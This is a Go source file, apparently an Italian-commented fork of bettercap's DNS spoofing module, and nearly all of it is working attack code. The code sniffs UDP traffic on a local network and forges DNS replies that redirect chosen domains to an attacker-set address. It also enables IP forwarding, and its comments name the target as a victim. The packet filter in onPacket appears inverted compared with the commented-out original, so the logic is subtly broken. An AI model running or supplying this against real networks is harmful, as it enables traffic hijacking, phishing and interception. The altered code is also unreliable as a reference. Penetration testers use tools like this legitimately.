package dns_spoof

import (
	"bytes"
	"fmt"
	"net"
	"strconv"
	"sync"

	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	"github.com/gopacket/gopacket/pcap"
)

type DNSSpoofer struct {
	session.SessionModule
	Handle        *pcap.Handle
	Hosts         Hosts
	TTL           uint32
	All           bool
	waitGroup     *sync.WaitGroup
	pktSourceChan chan gopacket.Packet
}

func NewDNSSpoofer(s *session.Session) *DNSSpoofer {
	mod := &DNSSpoofer{
		SessionModule: session.NewSessionModule("dns.spoof", s),
		Handle:        nil,
		All:           false,
		Hosts:         Hosts{},
		TTL:           1024,
		waitGroup:     &sync.WaitGroup{},
	}

	mod.SessionModule.Requires("net.recon")

	mod.AddParam(session.NewStringParameter("dns.spoof.hosts",
		"",
		"",
		"If not empty, this hosts file will be used to map domains to IP addresses."))

	mod.AddParam(session.NewStringParameter("dns.spoof.domains",
		"",
		"",
		"Comma separated values of domain names to spoof."))

	mod.AddParam(session.NewStringParameter("dns.spoof.address",
		session.ParamIfaceAddress,
		session.IPv4Validator,
		"IP address to map the domains to."))

	mod.AddParam(session.NewBoolParameter("dns.spoof.all",
		"false",
		"If true the module will reply to every DNS request, otherwise it will only reply to the one targeting the local pc."))

	mod.AddParam(session.NewStringParameter("dns.spoof.ttl",
		"1024",
		"^[0-9]+$",
		"TTL of spoofed DNS replies."))

	mod.AddHandler(session.NewModuleHandler("dns.spoof on", "",
		"Start the DNS spoofer in the background.",
		func(args []string) error {
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("dns.spoof off", "",
		"Stop the DNS spoofer in the background.",
		func(args []string) error {
			return mod.Stop()
		}))

	return mod
}

func (mod DNSSpoofer) Name() string {
	return "dns.spoof"
}

func (mod DNSSpoofer) Description() string {
	return "Replies to DNS messages with spoofed responses."
}

func (mod DNSSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@gmail.com>"
}

func (mod *DNSSpoofer) Configure() error {
	var err error
	var ttl string
	var hostsFile string
	var domains []string
	var address net.IP

	if mod.Running() {
		return session.ErrAlreadyStarted(mod.Name())
	} else if mod.Handle, err = network.Capture(mod.Session.Interface.Name()); err != nil {
		return err
	} else if err = mod.Handle.SetBPFFilter("udp"); err != nil {
		return err
	} else if err, mod.All = mod.BoolParam("dns.spoof.all"); err != nil {
		return err
	} else if err, address = mod.IPParam("dns.spoof.address"); err != nil {
		return err
	} else if err, domains = mod.ListParam("dns.spoof.domains"); err != nil {
		return err
	} else if err, hostsFile = mod.StringParam("dns.spoof.hosts"); err != nil {
		return err
	} else if err, ttl = mod.StringParam("dns.spoof.ttl"); err != nil {
		return err
	}

	mod.Hosts = Hosts{}
	for _, domain := range domains {
		mod.Hosts = append(mod.Hosts, NewHostEntry(domain, address))
	}

	if hostsFile != "" {
		mod.Info("loading hosts from file %s ...", hostsFile)
		if err, hosts := HostsFromFile(hostsFile, address); err != nil {
			return fmt.Errorf("error reading hosts from file %s: %v", hostsFile, err)
		} else {
			mod.Hosts = append(mod.Hosts, hosts...)
		}
	}

	if len(mod.Hosts) == 0 {
		return fmt.Errorf("at least dns.spoof.hosts or dns.spoof.domains must be filled")
	}

	for _, entry := range mod.Hosts {
		mod.Info("%s -> %s", entry.Host, entry.Address)
	}

	if !mod.Session.Firewall.IsForwardingEnabled() {
		mod.Info("enabling forwarding.")
		mod.Session.Firewall.EnableForwarding(true)
	}

	_ttl, _ := strconv.Atoi(ttl)
	mod.TTL = uint32(_ttl)

	return nil
}

// DnsReply
//
//	s			sessione utente attiva
//	TTL			TTL da assegnare al dominio
//	pkt			pacchetto originario
//	peth		layer ethernet del pacchetto originario
//	pudp		layer UDP del pacchetto originario
//	domain		dominio target
//	address		Indirizzo da associare al dominio
//	req			DNS requesto originaria
//	target		indirizzo vittima
func DnsReply(
	s *session.Session,
	TTL uint32,
	pkt gopacket.Packet,
	peth *layers.Ethernet,
	pudp *layers.UDP,
	domain string,
	address net.IP,
	req *layers.DNS,
	target net.HardwareAddr) (string, string) {

	redir := fmt.Sprintf("(->%s)", address.String())
	who := target.String()

	if t, found := s.Lan.Get(target.String()); found {
		who = t.String()
	}

	var err error
	var src, dst net.IP

	nlayer := pkt.NetworkLayer()
	if nlayer == nil {
		log.Debug("missing network layer skipping packet.")
		return "", ""
	}

	var eType layers.EthernetType
	var ipv6 bool

	// Analizza il livello di Rete per parsare i dati IP
	if nlayer.LayerType() == layers.LayerTypeIPv4 {
		pip := pkt.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
		src = pip.DstIP
		dst = pip.SrcIP
		ipv6 = false
		eType = layers.EthernetTypeIPv4

	} else {
		pip := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
		src = pip.DstIP
		dst = pip.SrcIP
		ipv6 = true
		eType = layers.EthernetTypeIPv6
	}

	eth := layers.Ethernet{
		SrcMAC:       peth.DstMAC,
		DstMAC:       target,
		EthernetType: eType,
	}

	//  Crea la query di risposta
	answers := make([]layers.DNSResourceRecord, 0)
	for _, q := range req.Questions {
		// do not include types we can't handle and that are not needed
		// for successful spoofing anyway
		// ref: https://github.com/bettercap/bettercap/issues/843
		if q.Type.String() == "Unknown" {
			continue
		}

		answers = append(answers,
			layers.DNSResourceRecord{
				Name:  []byte(q.Name),
				Type:  q.Type,
				Class: q.Class,
				TTL:   TTL,
				IP:    address,
			})
	}

	dns := layers.DNS{
		ID:        req.ID,
		QR:        true,
		OpCode:    layers.DNSOpCodeQuery,
		QDCount:   req.QDCount,
		Questions: req.Questions,
		Answers:   answers,
	}

	var raw []byte

	if ipv6 {
		ip6 := layers.IPv6{
			Version:    6,
			NextHeader: layers.IPProtocolUDP,
			HopLimit:   64,
			SrcIP:      src,
			DstIP:      dst,
		}

		udp := layers.UDP{
			SrcPort: pudp.DstPort,
			DstPort: pudp.SrcPort,
		}

		udp.SetNetworkLayerForChecksum(&ip6)

		err, raw = packets.Serialize(&eth, &ip6, &udp, &dns)
		if err != nil {
			log.Error("error serializing ipv6 packet: %s.", err)
			return "", ""
		}
	} else {
		ip4 := layers.IPv4{
			Protocol: layers.IPProtocolUDP,
			Version:  4,
			TTL:      64,
			SrcIP:    src,
			DstIP:    dst,
		}

		udp := layers.UDP{
			SrcPort: pudp.DstPort,
			DstPort: pudp.SrcPort,
		}

		udp.SetNetworkLayerForChecksum(&ip4)

		err, raw = packets.Serialize(&eth, &ip4, &udp, &dns)
		if err != nil {
			log.Error("error serializing ipv4 packet: %s.", err)
			return "", ""
		}
	}

	log.Debug("sending %d bytes of packet ...", len(raw))
	if err := s.Queue.Send(raw); err != nil {
		log.Error("error sending packet: %s", err)
		return "", ""
	}

	return redir, who
}

func (mod *DNSSpoofer) onPacket(pkt gopacket.Packet) {
	/**
	 *	Questa funzione non af altro che parsare il pacchetto alla ricerca della query
	 *	Poi costruisce la risposta
	 */
	typeEth := pkt.Layer(layers.LayerTypeEthernet)
	typeUDP := pkt.Layer(layers.LayerTypeUDP)
	if typeEth == nil || typeUDP == nil {
		return
	}

	eth := typeEth.(*layers.Ethernet)
	if !mod.All || bytes.Equal(eth.DstMAC, mod.Session.Interface.HW) {
		return
	}

	dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
	if !(parsed && dns.OpCode == layers.DNSOpCodeQuery) {
		return
	}
	if !(len(dns.Questions) > 0 && len(dns.Answers) == 0) {
		mod.Debug("skipping dns request, no queries Q:%v A:%v ", len(dns.Questions), len(dns.Answers))
		return
	}

	for _, q := range dns.Questions {
		qName := string(q.Name)
		address := mod.Hosts.Resolve(qName)

		if address == nil {
			mod.Debug("skipping domain %s", qName)
			continue
		}

		err, raw := packets.NewDNSReplyFromRequest(pkt, qName, address, mod.TTL)
		if err != nil {
			mod.Error("Unexpected error while crafting dns packet")
			break
		}
		mod.Session.Queue.Send(raw)
		//mod.Info("Sending %v bytes of dns response", len(raw))
		//mod.Debug("Packet sent:\n%v", gopacket.NewPacket(raw, layers.LayerTypeEthernet, gopacket.Default))
		break
	}

	// "Estrae" il frame ethernet
	/*
		eth := typeEth.(*layers.Ethernet)
		if mod.All || bytes.Equal(eth.DstMAC, mod.Session.Interface.HW) {
			// "Estrae" DNS
			dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
			// Se contiene una Question e nessuna Answer
			if parsed && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && len(dns.Answers) == 0 {
				for _, q := range dns.Questions {
					qName := string(q.Name)
					if address := mod.Hosts.Resolve(qName); address != nil {
						// TODO: Sto coso fa schifo, pare godzilla
						redir, who := DnsReply(mod.Session, mod.TTL, pkt, eth, udp, qName, address, dns, eth.SrcMAC)
						if redir != "" && who != "" {
							mod.Info("sending spoofed DNS reply for %s %s to %s.", tui.Red(qName), tui.Dim(redir), tui.Bold(who))
						}
						break
					} else {
						mod.Debug("skipping domain %s", qName)
					}
				}
			}
		}
	*/
}

func (mod *DNSSpoofer) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	return mod.SetRunning(true, func() {
		mod.waitGroup.Add(1)
		defer mod.waitGroup.Done()

		// Sorgente dei pacchetti
		src := gopacket.NewPacketSource(mod.Handle, mod.Handle.LinkType())
		// Stream di lettura pacchetti
		mod.pktSourceChan = src.Packets()
		for packet := range mod.pktSourceChan {
			if !mod.Running() {
				break
			}

			mod.onPacket(packet)
		}
	})
}

func (mod *DNSSpoofer) Stop() error {
	return mod.SetRunning(false, func() {
		mod.pktSourceChan <- nil
		mod.Handle.Close()
		mod.waitGroup.Wait()
	})
}